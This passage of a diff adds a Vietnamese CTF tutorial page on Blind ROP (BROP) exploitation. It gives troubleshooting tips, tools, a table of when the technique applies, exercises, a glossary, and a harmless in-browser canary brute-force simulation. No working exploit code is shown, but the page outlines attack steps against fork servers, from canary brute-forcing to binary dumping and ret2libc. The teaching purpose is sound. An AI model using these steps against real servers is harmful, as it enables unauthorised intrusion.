+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Không tìm thấy stop gadget</h4><p>Mở rộng dải quét. Stop có thể là địa chỉ trả data (puts).</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>PIE (base ngẫu nhiên)</h4><p>Phải leak base trước (overflow đọc saved RIP). Khó hơn nhiều.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">pwntools remote</div><h4>probe</h4><p>Kết nối lại mỗi lần thử.</p></div>
+    <div class="card"><div class="term">braille / abyssal</div><h4>BROP tự động</h4><p>Thư viện cộng đồng.</p></div>
+    <div class="card"><div class="term">ELF("dumped")</div><h4>Sau dump</h4><p>Phân tích binary thu được.</p></div>
+    <div class="card"><div class="term">one_gadget</div><h4>Sau leak libc</h4><p>Lấy shell nhanh.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi brute lỗi</h2>
+  <div class="grid">
+    <div class="card"><h4>Probe false positive</h4><p>Oracle nhiễu. Thử lại mỗi addr 2-3 lần, lấy đa số.</p></div>
+    <div class="card"><h4>Quá chậm</h4><p>Hàng nghìn kết nối. Song song hoá probe (nhiều socket).</p></div>
+    <div class="card"><h4>Canary byte đầu ≠ 0</h4><p>Hiếm; glibc canary luôn \x00 byte thấp.</p></div>
+    <div class="card"><h4>Không phải fork server</h4><p>ASLR đổi mỗi lần → BROP không áp dụng.</p></div>
+    <div class="card"><h4>Dump sai</h4><p>write len/addr sai. Kiểm ELF magic \x7fELF đầu.</p></div>
+    <div class="card"><h4>BROP gadget sai offset</h4><p>+9 pop rdi không chuẩn mọi build. Probe xác nhận từng pop.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Khi nào BROP</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Điều kiện</th><th>Áp dụng?</th></tr></thead>
+    <tbody>
+      <tr><td>fork server + overflow + no-PIE</td><td class="yes">BROP kinh điển</td></tr>
+      <tr><td>fork server + PIE</td><td class="maybe">cần leak base trước</td></tr>
+      <tr><td>Không fork (exec lại)</td><td class="no">ASLR đổi → không brute được</td></tr>
+      <tr><td>Có partial leak (puts output)</td><td class="yes">stop gadget = hàm in → dễ hơn</td></tr>
+      <tr><td>Canary tắt</td><td class="yes">bỏ bước brute canary</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Kiến trúc</span>x86-64 BROP dùng đuôi <code>__libc_csu_init</code> (pre-gcc 2.34). Binary mới (gcc ≥ 11, không csu) cần gadget khác. 32-bit: tham số qua stack nên không cần BROP gadget phức tạp — dễ hơn. ARM hiếm gặp BROP CTF.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐ · brute canary</div><p>Fork server, leak 8-byte canary bằng oracle.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · stop+BROP gadget</div><p>Tìm stop gadget, BROP gadget, pop rdi.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐⭐ · dump &amp; shell</div><p>Tìm write@plt, dump binary, ret2libc.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">BROP</div><p>ROP không có binary.</p></div>
+    <div class="card"><div class="term">fork server</div><p>ASLR cố định giữa client.</p></div>
+    <div class="card"><div class="term">oracle</div><p>crash/không = 1 bit.</p></div>
+    <div class="card"><div class="term">stop gadget</div><p>ret tới không crash.</p></div>
+    <div class="card"><div class="term">BROP gadget</div><p>Đuôi csu lấy pop rdi/rsi.</p></div>
+    <div class="card"><div class="term">dump</div><p>write() in binary ra socket.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="rop_basics.html">ROP</a> · <a href="ret2csu.html">ret2csu</a> (BROP gadget cùng nguồn) · <a href="canary.html">canary</a> · <a href="ret2libc.html">ret2libc</a> (sau dump).</li>
+    <li>Bittau, Belay, Mashtizadeh, Boneh, Mazières "Hacking Blind" (IEEE S&amp;P 2014) — paper gốc BROP.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 5 · Blind.</strong> Không có binary + server fork (ASLR cố định) + oracle crash/không → brute canary, stop gadget, BROP gadget (pop rdi), PLT write, dump binary, rồi ret2libc. Pwn hoàn toàn trong bóng tối.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("brop-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("brop-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var secret=Math.floor(Math.random()*256);
+  var guessIn=document.getElementById("guessIn"),logEl=document.getElementById("bbLog");
+  function pv(s){s=(s||"").trim();if(/^0x/i.test(s))return parseInt(s,16);if(/^\d+$/.test(s))return parseInt(s,10);return NaN;}
+  function add(html){var d=document.createElement("div");d.innerHTML=html;logEl.insertBefore(d,logEl.firstChild);}
+  function hx(b){return "0x"+b.toString(16).padStart(2,"0");}
+  function tryByte(b){
+    if(b===secret){add('probe '+hx(b)+' → <span class="hang">KHÔNG crash ✓ (byte đúng!)</span>');return true;}
+    add('probe '+hx(b)+' → <span class="crash">crash ✗</span>');return false;
+  }
+  document.getElementById("tryBtn").addEventListener("click",function(){
+    var b=pv(guessIn.value);if(isNaN(b)||b<0||b>255){add('nhập 0x00-0xff');return;}tryByte(b);
+  });
+  document.getElementById("autoBtn").addEventListener("click",function(){
+    logEl.innerHTML="";var i=0;
+    var t=setInterval(function(){
+      if(i>255){clearInterval(t);return;}
+      if(tryByte(i)){add('<b>→ tìm ra sau '+(i+1)+' probe. Trung bình ~128/byte, ×8 byte ≈ 1024 kết nối.</b>');clearInterval(t);return;}
+      i++;
+    },18);
+  });
+  document.getElementById("resetBtn").addEventListener("click",function(){secret=Math.floor(Math.random()*256);logEl.innerHTML="";add('canary mới (ẩn). Brute lại.');});
+  add('canary byte bí mật đã đặt (ẩn). Đoán hoặc tự brute.');
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
